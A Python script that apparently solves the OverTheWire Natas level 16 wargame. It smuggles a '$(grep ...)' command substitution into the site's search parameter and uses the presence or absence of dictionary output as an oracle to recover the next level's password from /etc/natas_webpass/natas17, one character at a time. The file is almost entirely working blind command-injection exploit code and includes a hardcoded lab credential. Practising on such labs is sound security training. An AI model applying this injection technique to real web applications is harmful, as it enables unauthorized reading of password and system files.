#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Jan 18 10:39:49 2020

@author: Drew
"""

import requests

# the natas passwords to date have included numbers and upper and lower case letters
posschar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# initialise an empty string to hold the successful characters
usedchar = ""

# for each character in the possible characters string
for char1 in posschar:
  
    # form a url that creates a query that greps /etc/natas_webpass/natas17 for each letter
    url = 'http://natas16.natas.labs.overthewire.org/?needle=%24%28+grep+' + char1 +'+%2Fetc%2Fnatas_webpass%2Fnatas17+%29&submit=Search'
  
    # make the request to the webpage, using the natas15 credentials
    req = requests.get(url, auth=("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))

    # if the word "African", indicating the whole dictionary is returned, is not in the response
    if "African" not in req.text:
        # add that character to the used characters string
        usedchar += char1

# display the characters used in the password
print ("Got the characters used in the password")
print (usedchar)

# initialise an empty string to hold the successful password
password = ""

# set the places counter equal to zero 
places = 0

# loop through this process for at most 32 places (we know there are 32 characters in these passwords)
while places <= 32:
    
    # increment the places counter by 1
    places += 1

    # for each character in the used characters string
    for char2 in usedchar:
    
        # form a url that creates a query that greps /etc/natas_webpass/natas17 for each letter
        # using the discovered password start and the current character
        url = 'http://natas16.natas.labs.overthewire.org/?needle=%24%28+grep+'+password+char2+'+%2Fetc%2Fnatas_webpass%2Fnatas17+%29&submit=Search'
    
        # make the request to the webpage, using the natas15 credentials
        req = requests.get(url, auth=("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))

        # get the length of the current password build
        length = len(password)
     
        # if the word "African" (ie. the dictionary) is in the text of the response
        if "African" not in req.text:
           
            # add that character to the end of the password string
            password += char2
    
            # display the password as it builds
            print(password)

    # stop running if no characters are added
    if len(password) == length:
        places += 2 

# sets a new places counter
places2 = 0
while places2 <= 32:
    
    # increment the places2 counter by 1
    places2 += 1

    # for each character in the used characters string
    for char3 in usedchar:
    
        # form a url that creates a query that greps /etc/natas_webpass/natas17 for each letter
        # using the current character start and the discovered password 
        url = 'http://natas16.natas.labs.overthewire.org/?needle=%24%28+grep+'+char3+password+'+%2Fetc%2Fnatas_webpass%2Fnatas17+%29&submit=Search'
    
        # make the request to the webpage, using the natas15 credentials
        req = requests.get(url, auth=("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"))

        # get the length of the current password build
        length = len(password)
     
        # if the word "African" (ie. the dictionary) is in the text of the response
        if "African" not in req.text:
           
            # add that character to the start of the password string
            password = char3 + password
    
            # display the password as it builds
            print(password)

    # stop running if no characters are added
    if len(password) == length:
        places2 += 2 

print("The password is: " + password)


    
